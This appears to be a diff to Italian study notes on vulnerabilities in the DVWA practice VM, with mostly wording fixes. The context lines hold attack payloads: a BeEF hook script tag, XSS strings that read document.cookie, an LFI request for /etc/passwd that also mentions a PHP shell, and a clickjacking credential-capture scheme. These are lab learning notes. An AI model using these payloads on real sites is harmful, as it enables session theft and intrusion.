@@ -1,14 +1,17 @@
+Studio delle Vulnerabilità presenti sulla VM DVWA.
+
 VULNERABILITA'
 
 ***Beef xss framework***
-	una volta avviato beef, sul terminale viene indicato uno script che deve essere inviato al server. STEP:
+	una volta avviato beef, sul terminale viene indicato uno script che deve essere inviato al server.
+	STEP:
 		1. copia lo script <script src="http://127.0.0.1:3000/hook.js"></script>
 		2. incollalo nel campo
 		3. fino a quando la tab della vittima resta aperta, beef puo' intercettare ed inoltrare exploit
 
 ***XSS Reflected***
 	Ottengo nella stessa pagina il risultato dello script che passo
-	Claudio<script>alert(1)</script>
+	Nome<script>alert(ciao mondo!)</script>
 
 	LEVEL LOW:
 		<script>alert(document.cookie)</script>
@@ -30,7 +33,7 @@ VULNERABILITA'
 
 
 ***LFI***
-ci consente di includere all'interno della pagina html qualsiasi file all'interno del file sistema
+Consente di includere all'interno della pagina html qualsiasi file all'interno del file sistema
 	LEVEL LOW:
 		posso leggere il contenuto dei file di rete  -->  http://192.168.236.129/DVWA/vulnerabilities/fi/?page=/etc/passwd
 		mando in esecuzione un file esterno .php con una shell. Dando poi il comando "ls" leggo il contenuto della cartella.
@@ -128,5 +131,5 @@ disabilitare modulo php -->   a2dismod php7.2
 
 
 ***CLICKJACKING***
-la ittima apre la pagina contenente un form sul suo sito dell'attaccante. La pagina e' posizionata su una pagina con iframe e con 2 text box sopra le text-box originali.
+la vittima apre la pagina contenente un form sul suo sito dell'attaccante. La pagina e' posizionata su una pagina con iframe e con 2 text box sopra le text-box originali.
 La vittima inserisce le credenziali e verra' reindirizzata al form corretto.
